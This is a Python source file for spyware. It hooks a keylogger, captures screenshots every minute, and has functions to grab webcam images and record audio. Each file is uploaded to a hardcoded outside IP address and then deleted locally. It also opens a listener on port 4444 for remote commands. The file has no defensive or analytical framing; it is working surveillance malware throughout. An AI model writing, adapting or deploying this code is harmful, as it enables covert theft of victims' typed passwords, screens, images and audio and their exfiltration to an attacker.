import os
import socket
import time
import keyboard
import pyautogui
from tools.send import upload_file
import sounddevice as sd
import scipy.io.wavfile as wav
import shutil
import cv2
import threading

def capture_webcam_image():
    # Access the webcam (every webcam has a number, the default is 0)
    cap = cv2.VideoCapture(0)

    # Read a frame from the webcam; retval is a boolean that is True if the frame is read correctly
    retval, frame = cap.read()

    if retval:
        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        dir_path = 'webcam_photo'
        os.makedirs(dir_path, exist_ok=True)
        filename = f'webcam_{timestamp}.png'
        full_path = os.path.join(dir_path, filename)

        # Save the frame as an image file
        cv2.imwrite(full_path, frame)

        # Upload the file
        upload_file(f"{full_path}", '187.65.202.131')

        # Delete the image file
        os.remove(f"{full_path}")

        # Delete the folder
        shutil.rmtree(dir_path)
    else:
        print("Could not capture image from webcam")

    # When everything done, release the capture
    cap.release()
    cv2.destroyAllWindows()


def record_audio(duration=30):
    fs = 44100
    # Record audio
    print("Recording...")
    my_recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait for the recording to finish
    print("Recording completed")

    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

    filename = f"record_{timestamp}.wav"
    dir_path = 'records'
    os.makedirs(dir_path, exist_ok=True)
    full_path = os.path.join(dir_path, filename)

    # Save as WAV file
    wav.write(full_path, fs, my_recording)
    upload_file(f"{full_path}", '187.65.202.131')
    os.remove(full_path)
    shutil.rmtree(dir_path)


def capture_screenshot():
    # Capture screenshot
    screenshot = pyautogui.screenshot()
    # Get the current timestamp
    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
    # Save the screenshot as a file with the timestamp
    dir_path = 'screenshots'
    os.makedirs(dir_path, exist_ok=True)
    filename = f'screenshot_{timestamp}.png'
    full_path = os.path.join(dir_path, filename)
    screenshot.save(full_path)
    return full_path


buffer = []  # Buffer to hold key presses
last_write_time = [time.time()]  # Time we last wrote to the file
last_key_time = [time.time()]  # Time of last key press


def log_key(event):
    current_time = time.time()

    # Check if more than 5 seconds have passed since the last key press
    if current_time - last_key_time[0] > 5:
        buffer.append('\n')
    elif event.name == 'space':
        buffer.append(' ')
    elif event.name == 'backspace' and buffer:
        buffer.pop()  # remove the last character from the buffer
    elif event.name in ('left shift', 'right shift'):
        pass  # ignore shift keys
    else:
        buffer.append(event.name)

    last_key_time[0] = current_time


def take_screenshot_and_upload():
    # Capture screenshot
    file_path = capture_screenshot()

    # Upload the file
    upload_file(f"{file_path}", '187.65.202.131')

    # Delete the screenshot file
    os.remove(f"{file_path}")
    shutil.rmtree(os.path.dirname(file_path))


def dump_keys():
    with open('keys.txt', 'a') as f:
        f.write(''.join(buffer))
    buffer.clear()  # Clear the buffer
    upload_file('keys.txt', '187.65.202.131')


def task_loop():
    while True:
        take_screenshot_and_upload()
        #capture_webcam_image()
        dump_keys()
        #record_audio(duration=30)
        time.sleep(60)  # Pause for 1 minute


def get_machine_ip():
    # Create a temporary socket to retrieve the machine's IP address
    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    temp_socket.connect(('8.8.8.8', 80))  # Connect to a remote server (Google DNS)

    machine_ip = temp_socket.getsockname()[0]  # Get the machine's IP address

    temp_socket.close()  # Close the temporary socket

    return machine_ip

def listen_commands():
    # Get the machine's IP address
    machine_ip = get_machine_ip()

    # Create a socket for listening to server commands
    server_address = (machine_ip, 4444)  # Replace with the actual server address and port
    command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_socket.bind(server_address)
    command_socket.listen(1)
    print(f"Listening for commands on {server_address[0]}:{server_address[1]}...")

    while True:
        # Wait for a client to connect
        client_socket, client_address = command_socket.accept()
        print(f"Command received from {client_address[0]}:{client_address[1]}")

        # Receive the command from the client
        command = client_socket.recv(1024).decode()

        # Process the command (replace with your own command processing logic)
        if command == 'task1':
            print("Performing task 1...")
            # Perform task 1
        elif command == 'task2':
            print("Performing task 2...")
            # Perform task 2
        else:
            print("Unknown command received.")

        # Close the client connection
        client_socket.close()

        time.sleep(1)  # Pause for 1 second before listening for the next command

    # Close the command socket
    command_socket.close()


def start_loop():
    print('Process started')
    keyboard.on_press(log_key)

    # Create and start the task loop thread
    task_thread = threading.Thread(target=task_loop)
    task_thread.start()

    # Create and start the command listener thread
    command_thread = threading.Thread(target=listen_commands)
    command_thread.start()

    # Wait for the threads to finish (which will be never in this case)
    task_thread.join()
    command_thread.join()


if __name__ == '__main__':
    start_loop()
